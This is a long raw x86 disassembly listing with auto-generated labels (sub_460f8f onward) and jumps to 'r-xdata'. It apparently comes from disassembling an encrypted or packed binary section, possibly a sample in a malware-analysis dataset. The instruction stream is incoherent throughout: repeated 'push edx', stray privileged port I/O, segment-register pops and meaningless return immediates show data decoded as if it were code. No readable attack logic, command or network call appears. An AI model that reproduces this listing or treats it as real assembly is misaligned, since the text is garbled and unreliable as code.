test eax 0x5238adad
lodsd [ esi ]
imul edx [ ecx + 0x527bd65d ] 0x3a015252
mov [ 0xffffffffad123b4f ] eax
in al 0x96
push edx
push edx
push edx
fldcw [ edx + edi * 4 - 0x52525a7c ]
rcl [ esi - 0x47cd90a2 ] 0x1
push edx
push edx
pop ebp
aad 0x5a
push edx
push edx
push edx
cmp ch [ edx - 0x52adad88 ]
add al 0x5a
imul ecx [ esi ] 0x76
inc esi
pop ebp
salc
fidiv [ edi + 0x52 ]
push edx
in eax dx
cli
xor edx [ edx + 0x52 ]
xchg ebp eax
push ss
jbe r-xdata
mov ebx 0x52524185
retn 0x380a
0x5268
sub_460f8f
daa
mov dh 0xad
add eax 0x7a1cd94e
mov ebx 0x52521a2f
or edx edi
xchg edx eax
pop ebp
salc
sub eax 0xbb52525c
outsd
dec edx
push edx
push edx
add [ ebx + 0x5252601e ] edi
retn 0x27ad
sub_460ffb
sar [ esi + 0x5040132 ] 0x1
cmp [ ebx ] dh
or [ eax ] bh
and al 0xbb
loope r-xdata
xlat
0x2adadaf 0x4ad
popad
fwait
shr [ edx - 0x6c38a253 ] 0x1
mov ebx 0x52525775
mov ebx 0x52527371
retn 0xc2c2
push edx
push edx
pop ebp
salc
ficom [ ebx ]
push edx
push edx
mov ebx 0x52526916
retn 0xd7c2
sub_461059
salc
js r-xdata
mov esi [ ebx + ebx * 8 ]
bsf ecx [ ecx ]
xor al 0xdb
cpuid
cmp [ edi ] ah
or [ ebx + ebx * 8 ] esi
push fs
cmp [ ebx ] bh
mov ebx 0x5252519e
retn 0x93d1
push edx
push edx
mov ebx 0x52524e6b
retn 0xd7df
sub_4610ef
xchg ebx eax
fst [ ebx + 0x524bd0bb ]
push edx
pop es
fnstcw [ esi + 0x16ebed1 ]
popad
xchg edx eax
add al 0x5
fist [ edi ]
stosb [ edi ]
fist [ edi ]
cmpsb [ esi ] [ edi ]
fist [ edi ]
scasb [ edi ]
0x52525252 0xf05d
sub_4613c3
or bh [ eax ]
and al 0xd9
stosb [ edi ]
mov ebx 0x5252655d
xor al 0xdb
push ss
jbe r-xdata
retn 0xd1c2
popad
xchg edx eax
add al [ edx ]
fstp st6
jbe r-xdata
retn 0xc2c2
push edx
push edx
push edx
mov ebx 0x5252679a
sub_46145b
cmp [ esp + esi ] bh
fist [ edi ]
mov dl 0xa
cmp [ edi ] dh
xor al 0xdb
pop ss
mov al 0xa
cmp [ ebx ] bl
xor al 0xdb
pop ss
mov dh 0xa
mov ebx 0x5252572d
retn 0xc2c2
sub_4614f0
xlat
fwait
pop ebp
xlat
salc
push eax
push edx
push edx
mov ebx 0x52524f3c
fstp st7
shr [ edi + 0x102adad ] cl
lodsd [ esi ]
add eax 0x5d92d702
salc
je r-xdata
loope r-xdata
push edx
push edx
cmp [ esi + 0x3a ] dl
push edx
bound edx [ edx + 0x52 ]
mov ebx 0x5252723e
retn 0xc2c2
lodsd [ esi ]
lodsd [ esi ]
or edi [ ebx + 0x5252593b ]
retn 0xc2c2
push edx
push edx
retn 0xc2c2
sub_461525
lodsd [ esi ]
push edx
push edx
fisttp [ edi ]
stosb [ edi ]
xchg ebp eax
push ecx
or cl [ ebx ]
or ecx [ ebx ]
xor al 0x69
sbb [ ebp - 0x2a ] 0x69
push dx
push edx
fist [ edi ]
inc edx
fist [ edi ]
scasb [ edi ]
rcl [ edi ] 0x1
scasb [ edi ]
push esi
pop ebp
in eax 0x90
mov ebx 0x52525429
retn 0x4ad
sub_46154f
fst [ es : esi ]
jbe r-xdata
push edx
popad
push ebx
push ss
jbe r-xdata
fldcw [ ebx + 0x5d53add1 ]
xlat
adc [ ecx + 0x52 ] edi
push edx
imul ebp [ edi ] 0x46
mov ebx 0x525277fb
cmp [ esp + ecx + 0x38 ] bh
aaa
xor al 0xdb
pop ss
jb r-xdata
mov ebx 0xadadaa6a
retn 0xc2c2
xchg edx eax
adc bh [ ebx + 0x5252544c ]
retn 0xc2c2
xchg esp eax
xor al 0xdb
pop ss
jo r-xdata
xchg ebp eax
add bl cl
push ss
jbe r-xdata
cmp [ edx ] ch
fstp [ edx + 0x52739bbb ]
push edx
push ecx
retn 0x9ad9
mov edx 0xadada608
or edi [ ebx + 0x5252593b ]
retn 0xc2c2
sub_461590
xchg edx eax
pop ebp
salc
jbe r-xdata
into
push edx
push edx
push edx
popad
fwait
mov ebx 0x5252544e
fstp st7
out dx al
test al 0xad
lodsd [ esi ]
mov ebx 0x5252490d
retn 0x17df
push edx
push edx
popad
xchg edx eax
adc bh [ ebx + 0x5252544c ]
retn 0xc2c2
sub_461615
xchg edx eax
add bl bh
xlat
push cs
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
add ch [ ebp + 0x17df5a27 ]
xchg [ edx ] al
fstp st7
push es
test eax 0xbb02adad
cmp [ ebp + ebp * 4 - 0x3d3d3d53 ] bh
retn 0xc2c2
sub_46163a
mov ebx 0xadada3e4
or eax 0xdb346638
pop es
jle r-xdata
cli
mov edx 0x52527b7e
xlat
xchg edx eax
mov ebx 0x52526a1d
retn 0xc2c2
jo r-xdata
lodsd [ esi ]
rcl [ esi - 0x3d6e64be ] 0x1
fld [ ebp - 0x445b28cc ]
jb r-xdata
push edx
push edx
retn 0xc2c2
push edx
lodsd [ esi ]
push edx
push edx
retn 0x14db
sub_461652
xor al 0xdb
pop ds
scasb [ edi ]
mov ebx 0x52525b2d
cmp bl [ edi + 0x5375043 ]
fist [ edx + esi * 2 ]
mov edx 0x52527ef8
cmp al ch
inc ecx
jae r-xdata
push edx
add eax 0xbb5a14db
shr [ ecx - 0x3d3d5253 ] 0x1
retn 0xc2c2
sub_46167f
pop ebp
salc
add al 0xaa
lodsd [ esi ]
lodsd [ esi ]
shr [ ebx + 0x1fd05d3a ] 0x1
stosb [ edi ]
lodsd [ esi ]
lodsd [ esi ]
xlat
lodsd [ esi ]
pop ebp
xlat
pop ss
stosb [ edi ]
lodsd [ esi ]
lodsd [ esi ]
fist [ ecx ]
inc edx
mov ebx 0xadadbe8e
retn 0xc2c2
sub_4616ee
pop ebp
in eax 0x11
dec esi
xor al 0xd7
xchg edx eax
pop ebp
salc
sti
jg r-xdata
fcmovnbe st4
mov dl [ edx + 0x52 ]
push edx
mov edx 0x52525ac2
push edx
fldcw [ edx - 0x2f4456af ]
jo r-xdata
fcmovnbe st4
0xba525252 0x5ad7
push edx
push edx
fldcw [ edx + 0x43e89f3a ]
xor al [ 0x5286ecdb ]
push edx
push edx
mov ebx 0x52526f62
retn 0xc2c2
push edx
push edx
push edx
retn 0xc2c2
sub_46173d
bound edx [ edx + 0x52 ]
add bh [ eax ]
push edx
fcmovnbe st4
mov ss [ edx + 0x52 ]
push edx
lodsd [ esi ]
pop es
scasb [ edi ]
fcmovnbe st4
mov dl [ edx + 0x52 ]
push edx
mov edx 0x52525ac2
fcmovnbe st4
0xba525252 0x5ad7
push edx
push edx
fldcw [ edx + 0x43e89f3a ]
xor al [ 0x5286ecdb ]
push edx
push edx
mov ebx 0x52526f62
retn 0xc2c2
sub_46180d
push edx
mov edx 0xadada539
add ch [ ebp + 0x79bb3604 ]
jne r-xdata
inc edx
push edx
push edx
push edx
xlat
xchg edx eax
pop ebp
xlat
pop edx
push edx
push edx
push edx
cmp [ edx - 0x53 ] dl
push edx
fldenv [ edx - 0x44ab1ba3 ]
and ah [ ecx + 0x52 ]
push edx
shr [ 0xffffffffd65d525a ] 0x1
push ebp
push edx
push edx
push edx
fstp [ edx - 0x5240aa46 ]
lodsd [ esi ]
lodsd [ esi ]
jbe r-xdata
push edx
cmp [ edx - 0x53 ] dl
jbe r-xdata
mov ebx 0x525260e2
retn 0xd907
pop esi
push edx
push edx
retn 0xd1c2
lodsd [ esi ]
add al 0x26
lodsd [ esi ]
push ss
jbe r-xdata
mov edx 0xc2adadbf
fild [ edi ]
stosb [ edi ]
fst [ edi ]
scasb [ edi ]
fist [ edi ]
mov dh 0xd9
pop ss
stosb [ edi ]
fist [ edi ]
fst [ esi ]
jbe r-xdata
pop ss
sahf
cmp ch [ ebx ]
and dh [ edi ]
mov ebx 0x5252437c
retn 0xc2c2
push edx
retn 0xbb02
retn 0x7db
imul edx [ 0x7dd05d56 ] 0x61525279
xchg edx eax
fist [ esi ]
jbe r-xdata
mov edx 0xdba617d9
pop ss
mov esi 0x3bb9261
jne r-xdata
mov ebx 0x52525efd
retn 0x14db
sub_46187e
push edx
push edx
push edx
cmp dl [ edx - 0x2e ]
push edx
push edx
cmp [ edx - 0x53 ] dl
jbe r-xdata
pop esi
push edx
push edx
retn 0xd1c2
lodsd [ esi ]
add al 0x26
lodsd [ esi ]
push ss
jbe r-xdata
mov edx 0xc2adadbf
fild [ edi ]
stosb [ edi ]
fst [ edi ]
scasb [ edi ]
fist [ edi ]
mov dh 0xd9
pop ss
stosb [ edi ]
fist [ edi ]
fst [ esi ]
jbe r-xdata
pop ss
sahf
cmp ch [ ebx ]
and dh [ edi ]
mov ebx 0x5252437c
retn 0xc2c2
push edx
retn 0xbb02
retn 0x7db
imul edx [ 0x7dd05d56 ] 0x61525279
xchg edx eax
fist [ esi ]
jbe r-xdata
mov edx 0xdba617d9
pop ss
mov esi 0x3bb9261
jne r-xdata
mov ebx 0x52525efd
retn 0x14db
sub_4618bd
pop ss
inc esi
xor al 0xdb
daa
cmp bl cl
daa
add bl cl
xchg esp eax
xor al 0xdb
pop es
cmp [ ebx + ebx * 8 ] dh
pop ds
popad
mov [ edx - 0x5252468e ] edi
mov ebx 0xadadbfba
retn 0x7db
sub_46192f
mov esi 0x5245f4bb
push edx
xchg ebp eax
pop ss
out dx al
pop ds
pop ds
or dh [ edi ]
xchg ebp eax
pop ss
xchg edx eax
cmp al 0x4
pop ds
pop ds
xchg ebp eax
pop ss
0x723e2022 0x1795
sahf
cmp ch [ ebx ]
and dh [ edi ]
mov ebx 0x5252437c
retn 0xc2c2
sub_4619af
mov esi 0x527ce7bb
push edx
fist [ edi ]
mov edi 0x3dbb8961
mov ebx 0xc2c2adad
fstp st7
out 0xaa al
lodsd [ esi ]
lodsd [ esi ]
add bl bh
pop ss
mov esi 0x96d7df02
scasb [ edi ]
lodsd [ esi ]
lodsd [ esi ]
add bh [ ebx - 0x5252532d ]
retn 0xc2c2
sub_461a16
fisttp [ edi ]
scasb [ edi ]
fistp [ edi ]
cmpsb [ esi ] [ edi ]
fild [ edi ]
stosb [ edi ]
fst [ edi ]
scasb [ edi ]
fist [ edi ]
mov dh 0xd9
pop ss
stosb [ edi ]
fist [ edi ]
mov edx 0xadbf8abb
lodsd [ esi ]
retn 0xc2c2
sub_461a7e
fist [ edi ]
test al 0x38
aaa
or dh [ ebx + ebx * 8 ]
pop ss
scasb [ edi ]
popad
xchg edx eax
xor al 0xdb
pop ss
lodsb [ esi ]
fist [ edi ]
mov [ 0xffffffffbc71bb02 ] al
lodsd [ esi ]
lodsd [ esi ]
retn 0x4c2
sub_461ac9
xlat
xchg edx eax
pop ebp
salc
jecxz r-xdata
push edx
push edx
retn 0xc2c2
push edx
push edx
mov ebx 0x525267aa
mov ebx 0xadadaee1
retn 0xc2c2
sub_461b58
push edx
push edx
push edx
mov edx 0x5252711a
shr [ edx + 0x28d65d53 ] 0x1
mov eax [ 0xe73adad ]
jbe r-xdata
mov edi 0xdb34adad
pop ss
fist [ esi ]
jbe r-xdata
mov esp 0x526157bb
push edx
popad
xchg edx eax
or eax 0xbb04919b
mov al [ gs : 0xffffffffdfc2adad ]
or dl [ eax + 0x39 ]
xchg edx eax
push edi
cmp [ ecx + 0x61569457 ] ecx
cmp bl cl
clflush [ ebx + 0x52527fd7 ]
retn 0xc2c2
fist [ edi ]
add bh [ eax ]
push esp
cmp bh [ edx - 0x44adadaf ]
push esi
mov edx 0xbbc2adad
push edx
push edi
push edx
push edx
retn 0xc2c2
sub_461ba0
pop edx
push edx
push edx
lodsd [ esi ]
daa
scasb [ edi ]
add eax 0x52dac4ad
push edx
push edx
mov ebx 0xadadbfb8
xor al 0xdb
pop ss
mov esp 0x526157bb
push edx
popad
xchg edx eax
or eax 0xbb04919b
mov al [ gs : 0xffffffffdfc2adad ]
or dl [ eax + 0x39 ]
xchg edx eax
push edi
cmp [ ecx + 0x61569457 ] ecx
cmp bl cl
clflush [ ebx + 0x52527fd7 ]
retn 0xc2c2
sub_461c2f
fist [ esi ]
jbe r-xdata
push edx
push edx
retn 0xc2c2
add eax 0x48a1ba02
push edx
push edx
rcl [ esi + 0x762e6b5e ] 0x1
jb r-xdata
int1
pop ebp
salc
inc edx
push edx
push edx
push edx
fstp st6
jbe r-xdata
fst [ ebx + 0x526700bb ]
push edx
pop es
mov ebx 0x52524bae
retn 0x27ad
push eax
push edx
push edx
add bl cl
xchg esp eax
mov edx 0x52525c81
or ebx edi
push ss
jbe r-xdata
retn 0x94c2
add bl bh
push ss
jbe r-xdata
retn 0xbed9
mov ebx 0xadadaec4
retn 0xc2c2
sub_461cdd
add [ edx + 0x52527462 ] edi
cmp bh cl
cmpsd [ esi ] [ edi ]
das
outsb
add ebx ebx
aam 0xae
push edx
push edx
push edx
mov ebx 0x5252551a
add bh [ ebx + 0x52525917 ]
or [ eax ] bh
daa
xor al 0xdb
pop es
into
or [ ebx - 0x52525bb7 ] bh
retn 0xc2c2
sub_461d19
popad
mov [ ecx + ebp * 2 ] eax
test eax 0x4070d65d
push edx
push edx
imul ecx [ edi ] 0x5a
pop ebp
salc
dec ebx
inc eax
push edx
push edx
imul ecx [ edi ] 0x5e
pop ebp
salc
inc edx
inc eax
push edx
push edx
fxam
mov dl [ edx + 0x52 ]
push edx
imul esp [ ecx + 0x4050d65d ] 0x29bb5252
dec edx
push edx
push edx
retn 0xc2c2
sub_461d4f
adc bh [ edx ]
lodsb [ esi ]
xor dh [ ecx ]
mov edi 0x4614db05
mov edx 0x525277e7
cmp dl dh
sub [ edi + eax * 4 + 0x5 ] ecx
fist [ edx + ecx * 2 ]
mov edx 0x525277f5
cmp bl [ esi - 0x3 ]
xchg ecx eax
jecxz r-xdata
retn 0xdfc2
mov ebx 0xadada967
sub_461dcd
pop esp
push edx
push edx
push edx
in eax dx
sbb al 0x26
push edx
push edx
xor al 0x69
popfd
pop ebp
xlat
push esp
push edx
push edx
push edx
rcl [ eax + 0x50bad150 ] 0x1
xlat
xchg edx eax
pop ebp
salc
test [ esi - 0x63265253 ] bh
mov ebx 0xadadbe15
retn 0xc2c2
sub_461e0e
or [ eax ] bh
xor al 0xdb
pop es
out dx al
or [ eax ] bh
xor [ ebx + ebx * 8 ] dh
pop es
in al dx
or [ eax ] bh
cmp eax 0x52582dbb
push edx
popad
xchg edx eax
or al 0x9b
xchg ecx eax
retn 0xc2c2
sub_461e39
xlat
fwait
pop ebp
salc
inc eax
push edx
push edx
push edx
mov edx 0x52526162
xlat
xchg edx eax
pop ebp
salc
push edi
push edx
push edx
push edx
popad
fwait
xor al 0xdb
pop edx
xchg ecx eax
retn 0xc2c2
sub_461e62
push edx
push ecx
xchg edx eax
add al [ ebx ]
cmp [ ebx + 0x38 ] dl
push edx
mov ebx 0xadadbbae
rcl [ esi + 0x7616db5e ] 0x1
inc edx
xlat
xchg edx eax
mov ebx 0x52525030
retn 0x51c2
sub_461eff
lea eax [ ecx + 0x5a94d1a9 ]
adc dl bl
push cs
inc edi
int1
shr [ edx + esi * 2 - 0x52442fa3 ] 0x1
lodsd [ esi ]
lodsd [ esi ]
lodsd [ esi ]
pop ss
scasb [ edi ]
mov ebx 0xadadbcde
retn 0xc2c2
sub_462085
push ss
jbe r-xdata
retn 0xc2c2
mov ebx 0xadadabfa
fst [ edi ]
pop edx
lodsd [ esi ]
daa
cmpsb [ esi ] [ edi ]
mov edx 0xadadbbce
popad
xchg edx eax
mov ebx 0x525260e4
retn 0x14db
sub_46214b
push edx
rcl [ edx + 0x52 ] cl
cmp [ edx - 0x53 ] dl
jbe r-xdata
cmp [ edi ] dh
xor al 0xdb
pop ss
mov ecx ds
xchg ebp eax
xor al 0xdb
pop ss
mov dl 0xa
cmp [ edx ] ch
fldenv [ edx - 0x52467545 ]
lodsd [ esi ]
retn 0xbbc2
mov ebx 0xadada1a1
retn 0xc2c2
sub_4621f8
not [ edx + 0x52 ]
push edx
rcl [ edx - 0x2444fda6 ] 0x1
mov edi 0x2c2adad
fist [ edi ]
add [ edx ] 0x1
lodsd [ esi ]
les esi [ esi + 0x3a525252 ]
adc [ ebp + 0x52 ] 0x52
mov ebx 0x52524c4b
rcl [ esi + 0x7616db42 ] 0x1
jb r-xdata
xchg edx eax
pop ebp
salc
loop r-xdata
mov ebx 0x52524d8c
retn 0xc2c2
lodsd [ esi ]
lodsd [ esi ]
fistp [ ecx ]
sbb al [ ebx ]
fstp [ ecx ]
or bh [ edx + 0x525240f2 ]
or edi [ edx + 0x52524e39 ]
shr [ edx - 0x3029a2ad ] 0x1
mov esi 0xad61adad
mov ebx 0xadadafa0
retn 0xc2c2
sub_46225b
xchg edx eax
pop ebp
xlat
out 0x4c eax
push edx
push edx
cmp [ esi ] cl
or dh [ ebx + ebx * 8 ]
pop ss
inc edx
popad
xchg edx eax
cmp [ esp + esi - 0x25 ] bh
pop ss
inc eax
or bh [ eax ]
and al 0x34
fist [ edi ]
cmpsb [ esi ] [ edi ]
or dh [ ebx + ebx * 8 ]
pop ss
movsb [ edi ] [ esi ]
cmp [ eax ] dh
or bh [ ebx + 0x525270ac ]
retn 0x17da
sub_4622c5
fild [ edi ]
xchg esi eax
popad
xor [ ebx + ebx * 8 ] 0x7
xchg esp eax
or [ eax ] bh
cmp esi [ ebx + ebx * 8 ]
pop es
mov edx 0x34203808
fild [ edi ]
mov eax 0x527698bb
push edx
retn 0xc2c2
sub_462323
push eax
mov eax 0xa1bbadad
mov ebx 0x5dc2adad
salc
pop edx
push edx
push edx
push edx
cmp cl dl
push 0x4ad5252
pop edx
mov edx 0xadada5d2
mov ebx 0x52525a52
retn 0xc2c2
sub_462348
cmp [ ecx ] ah
or edi [ eax ]
xor edi [ ebx - 0x52524b39 ]
pop ebp
salc
bound edi [ edx + edx * 2 + 0x52 ]
popad
xchg edx eax
fwait
xchg ecx eax
cmp [ edx + 0x74f4bb58 ] edx
push edx
push edx
retn 0xc2c2
sub_462400
fisttp [ edi ]
push esi
cmp [ ecx + ecx + 0x34 ] ah
fisttp [ edi ]
push esp
cmp [ esi + 0x9 ] ah
xor al 0xdb
cvtps2pd xmm7 [ ebx - 0x525245be ]
pop ebp
xlat
outsd
inc esi
push edx
push edx
popad
xchg edx eax
mov ebx 0xadadbe7a
retn 0x919b
sub_462505
push ss
jbe r-xdata
and cl [ 0x524403bb ]
push edx
retn 0x6b34
imul edx [ esi ] 0x76
dec edx
pop ebp
rcr [ ebx ] 0x1
push ecx
push edx
push edx
mov ebx 0xadada385
mov ebx 0x52527924
retn 0xc2c2
sub_46256c
dec esi
pop ebp
salc
push esi
push edx
push edx
push edx
add eax 0x5d5a04ad
in eax 0x11
adc al 0x51
xchg ecx eax
lodsd [ esi ]
loop r-xdata
add eax 0x5723805
add eax 0xd6df0505
jbe r-xdata
push ebx
push edx
push edx
fstpnce st2
push edx
push ebx
push edx
push edx
mov ebx 0xadadab0b
retn 0xc2c2
mov ebx 0x525243bc
retn 0x505
push eax
push edx
push edx
mov ebx 0x52527bd2
retn 0x2c2
sub_462663
pop es
mov dh 0xd9
cmp [ ebx - 0x52525a36 ] 0xffffffc2
add eax 0x52cad4db
push edx
push edx
mov edx 0x52524ec8
cmp dh [ ebp + 0x13 ]
cmp cl [ ecx ]
add eax 0x52ced4db
push edx
push edx
mov edx 0x52524edb
fcmovnbe st4
push edx
push edx
push edx
rcl [ esi - 0x446b269e ] 0x1
mov ecx 0xc2525271
retn 0xc2c2
sub_46269e
lodsd [ esi ]
add al 0x26
mov edx 0x52527f96
xlat
xchg edx eax
pop ebp
xlat
push ebp
push edx
push edx
push edx
add [ ebp + 0x5252fec4 ] ebp
push edx
fisttp [ esi ]
jbe r-xdata
retn 0xc2c2
mov ebx 0x52527655
retn 0xd70b
sub_462768
scasb [ edi ]
xlat
mov [ ebp - 0x2a ] ebx
inc eax
jno r-xdata
xlat
sbb dh [ edx + 0x52 ]
push edx
lodsd [ esi ]
daa
pop esi
fst [ edi ]
pop edx
lodsd [ esi ]
add dh [ esi ]
lodsd [ esi ]
daa
scasb [ edi ]
push edx
mov ebx 0xadada47a
xor al 0xdb
das
mov esp 0xbb0d3438
inc edx
jl r-xdata
popad
fwait
shr [ edx - 0x6c38a253 ] 0x1
fldenv [ ebx - 0x6b267e53 ]
mov ebx 0xadada492
retn 0x2fd1
push edx
retn 0xc2c2
sub_4627b9
pop ss
scasb [ edi ]
add ch [ ebp + 0x53aad185 ]
pop ebp
xlat
sbb dh [ edx + 0x52 ]
push edx
lodsd [ esi ]
daa
pop esi
fst [ edi ]
pop edx
lodsd [ esi ]
add dh [ esi ]
lodsd [ esi ]
daa
scasb [ edi ]
popad
fwait
shr [ edx - 0x6c38a253 ] 0x1
fldenv [ ebx - 0x6b267e53 ]
mov ebx 0xadada492
retn 0x2fd1
sub_4627e9
scasb [ edi ]
push edx
pop ebp
salc
popad
movsb [ edi ] [ esi ]
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0x5252477b
add [ ebp + 0x5252d2c4 ] ebp
push edx
fist [ esi ]
jbe r-xdata
bound edi [ edx - 0x52527341 ]
rcl [ esi + 0x7636d15e ] 0x1
dec edx
push edx
shr [ 0xffffffffd45d5256 ] cl
in eax 0xae
lodsd [ esi ]
lodsd [ esi ]
shl [ esi ] 0x1
jbe r-xdata
imul edx [ ecx + 0x44c7d75d ] 0xbb015252
fild [ edx + edx * 2 + 0x52 ]
retn 0xc2c2
dec esp
mov edx 0x92d7adad
push edx
fist [ esi ]
jbe r-xdata
pop ebp
xlat
test [ eax - 0x58455253 ] ebp
push ecx
xchg edx eax
add bl [ ebp - 0x1b ]
push ebp
add dh [ ecx + ebx * 8 ]
adc eax 0x16513450
jbe r-xdata
push edx
push edx
mov ebx 0xadada897
retn 0xc2c2
pop ebp
in eax 0x92
add bl cl
xchg esp eax
mov edx 0xadada7e3
mov ebx 0xadada7bc
retn 0xdfc2
sub_462885
pop ss
add [ edx ] 0xdf
pop ss
salc
add bh [ ebx + 0x52524c9e ]
fist [ esi ]
jbe r-xdata
imul ebx [ edi ] 0x5e
pop ebp
aam 0x11
add bl bh
salc
jbe r-xdata
add bl [ ebp - 0x1b ]
push ebp
add dh [ ecx + ebx * 8 ]
adc eax 0x16513450
jbe r-xdata
push edx
push edx
push edx
mov ebx 0xadadaa36
retn 0xdb34
push edx
push edx
mov ebx 0xadada897
retn 0xc2c2
pop ebp
in eax 0x92
add bl cl
xchg esp eax
mov edx 0xadada7e3
mov ebx 0xadada7bc
retn 0xdfc2
sub_4628b9
pop ss
cmpsb [ esi ] [ edi ]
cmp [ edi ] dh
or dh [ ebx + ebx * 8 ]
pop ss
movsb [ edi ] [ esi ]
cmp [ eax ] ah
or dh [ ebx + ebx * 8 ]
pop ss
stosb [ edi ]
mov ebx 0xadad8d82
pop ebp
xlat
and eax 0xba52525e
dec esp
mov edx 0x92d7adad
pop ebp
xlat
test [ eax - 0x58455253 ] ebp
push ecx
push edx
push edx
mov ebx 0xadada897
retn 0xc2c2
sub_462924
mov [ 0xffffffffc2adad8a ] eax
or edx edi
xchg edx eax
pop ebp
xlat
and [ ebx + 0x52 ] al
push edx
fist [ edi ]
mov es [ edx ]
fst [ edx + edi * 4 - 0x52527717 ]
or edi [ ebx + 0x5252430b ]
mov ebx 0x52525f04
retn 0xc2c2
sub_46299b
pop ss
stosb [ edi ]
jo r-xdata
fist [ edi ]
xchg [ edx ] cl
mov ebx 0x52525953
jo r-xdata
retn 0xc2c2
push edx
push edx
xchg ebp eax
pop ss
scasb [ edi ]
and [ eax + 0x52 ] esi
mov ebx 0x52524363
retn 0xc2c2
sub_4629c8
daa
mov esp 0xa2d9adad
popad
mov [ ecx - 0x5f ] ebp
pop ebp
xlat
in al dx
jo r-xdata
lodsd [ esi ]
lodsd [ esi ]
retn 0x34c2
push edx
add [ ebp + 0x5252fe47 ] ebp
push edx
mov ebx 0xadadb6ad
retn 0xc2c2
sub_462a84
xchg ebp eax
pop ss
and [ eax ] 0x24
jb r-xdata
mov edx 0xadadb5b4
mov ebx 0xadadb8cf
retn 0xc2c2
mov edx 0x525246f6
or eax 0x92d7090c
pop ebp
salc
fstp [ ebx + 0x1fdfadad ]
mov bl bh
pop ss
cli
mov edx 0x525246dc
xlat
xchg edx eax
pop ebp
salc
and al 0xbb
lodsd [ esi ]
lodsd [ esi ]
fistp [ edi ]
0xbafa17df 0x4629
push edx
push edx
mov ebx 0x52524793
retn 0xdfc2
sub_462ada
clc
dec ebx
push edx
push edx
mov ebx 0x52525d70
pop ebp
salc
inc edx
dec edi
push edx
push edx
mov ebx 0x5252536e
retn 0xc2c2
sub_462b68
fist [ edi ]
stosb [ edi ]
fist [ edi ]
cmpsb [ esi ] [ edi ]
add bh [ eax ]
lodsd [ esi ]
lodsd [ esi ]
daa
mov esi 0x5a60fdb
mov edx 0xadada2cd
rcl [ esi + 0x5d92d746 ] 0x1
salc
lodsd [ esi ]
mov ch [ ebp + 0x6614d9ad ]
lodsd [ esi ]
daa
stosb [ edi ]
fist [ edi ]
sbb bh 0x17
add [ edx ] 0xbb
inc esi
jo r-xdata
pop ecx
push edx
push edx
push edx
retn 0xc2c2
xor al 0xdb
pop es
mov [ eax ] cs
cmp [ ecx ] ah
xor al 0xdb
pop es
mov dl 0xbb
cmp eax 0xdbadadb3
aam 0xda
push edx
push edx
push edx
mov edx 0x52524558
cmp ch [ edx - 0x51 ]
js r-xdata
fstp [ edx - 0x502d2821 ]
lodsd [ esi ]
lodsd [ esi ]
mov edx 0xadadb556
fist [ edi ]
mov dh 0x2
fist [ edi ]
fiadd [ edx ]
add [ ecx ] eax
cmp [ esi + 0x1 ] dl
add [ ebx + 0x525259cd ] edi
add eax 0x52c2d4db
push edx
push edx
mov edx 0x525244ab
cmp dh [ ebp - 0x44582dab ]
enter 0x5272 0x52
retn 0xc2c2
sub_462bb7
add bh [ edx + 0x52525922 ]
rcl [ esi - 0x53a52a2 ] 0x1
push edx
push edx
push edx
imul edx [ ecx - 0x55c529a3 ] 0x9ad9adad
fstp st7
shr [ edi + 0x56baadad ] cl
mov ch 0xad
lodsd [ esi ]
fist [ edi ]
mov dh 0x2
fist [ edi ]
fiadd [ edx ]
add [ ecx ] eax
cmp [ esi + 0x1 ] dl
add [ ebx + 0x525259cd ] edi
xor al 0xdb
pop es
mov [ eax ] cs
cmp [ ecx ] ah
xor al 0xdb
pop es
mov dl 0xbb
cmp eax 0xdbadadb3
aam 0xda
push edx
push edx
push edx
mov edx 0x52524558
cmp ch [ edx - 0x51 ]
js r-xdata
fstp [ edx - 0x502d2821 ]
lodsd [ esi ]
lodsd [ esi ]
mov edx 0xadadb556
add eax 0x52c2d4db
push edx
push edx
mov edx 0x525244ab
cmp dh [ ebp - 0x44582dab ]
enter 0x5272 0x52
retn 0xc2c2
sub_462cac
fnstcw [ esi + 0x505abed3 ]
push edx
push edx
fstp st7
stosb [ edi ]
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
mov edx 0xadadb472
fld [ edi ]
pop esi
mov edx 0xadadb0e5
add ch [ ebp + 0x52ba5a27 ]
mov edx 0xb0badad
mov ebx 0x52524b89
retn 0xc2c2
sub_462d44
pop ebp
sar [ eax - 0x45525254 ] 0x1
jb r-xdata
jbe r-xdata
push edx
push edx
mov ebx 0xadadb2ac
retn 0xc2c2
push edx
mov ebx 0x525247e6
retn 0xc2c2
push ebx
mov edx 0x52527117
or eax [ ebx + ebx * 8 ]
push ss
jbe r-xdata
fnstcw [ esi + 0x384ebed1 ]
or bh [ ss : eax ]
and eax 0x525bd1bb
push edx
mov edx 0xadadbca8
shl [ esi ] 0x1
jbe r-xdata
mov bl [ edi ]
cmp esi [ ecx ]
and [ ebp + 0x213d8e17 ] dl
cmp eax 0xb2179534
jb r-xdata
push edx
or ebx ebx
push ss
jbe r-xdata
ja r-xdata
and al 0x95
pop ss
0x43c370a 0xb8bb
retn 0x34c2
imul ebp [ esi ] 0x76
bound ebx [ ebp - 0x2a ]
pop ebp
push edx
push edx
push edx
add al 0xba
adc al 0x52
push edx
push edx
or edx edi
xchg edx eax
pop ebp
salc
push esi
push edx
push edx
push edx
fld [ esi ]
jbe r-xdata
retn 0x34c2
push edx
add eax 0x563aaad9
push ebx
push edx
push edx
fstp st7
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
add ah [ ecx - 0x5c ]
mov ebx 0x525245cb
retn 0xc2c2
add esi [ edi + 0x52 ]
imul ebp [ esi ] 0x76
dec esi
pop ebp
xlat
push edi
push edx
push edx
push edx
xchg esp eax
push ss
jbe r-xdata
push edx
xchg ebp eax
pop ss
sub_462d8e
push edx
push edx
push edx
cmp bl [ esi + 0x38525252 ]
push edx
mov ebx 0xadad8aa4
xchg esp eax
push ss
jbe r-xdata
push edx
mov ebx 0x525247e6
retn 0xc2c2
push ebx
mov edx 0x52527117
or eax [ ebx + ebx * 8 ]
push ss
jbe r-xdata
fnstcw [ esi + 0x384ebed1 ]
or bh [ ss : eax ]
and eax 0x525bd1bb
push edx
mov edx 0xadadbca8
shl [ esi ] 0x1
jbe r-xdata
mov bl [ edi ]
cmp esi [ ecx ]
and [ ebp + 0x213d8e17 ] dl
cmp eax 0xb2179534
jb r-xdata
push edx
or ebx ebx
push ss
jbe r-xdata
ja r-xdata
and al 0x95
pop ss
0x43c370a 0xb8bb
retn 0x34c2
imul ebp [ esi ] 0x76
bound ebx [ ebp - 0x2a ]
pop ebp
push edx
push edx
push edx
add al 0xba
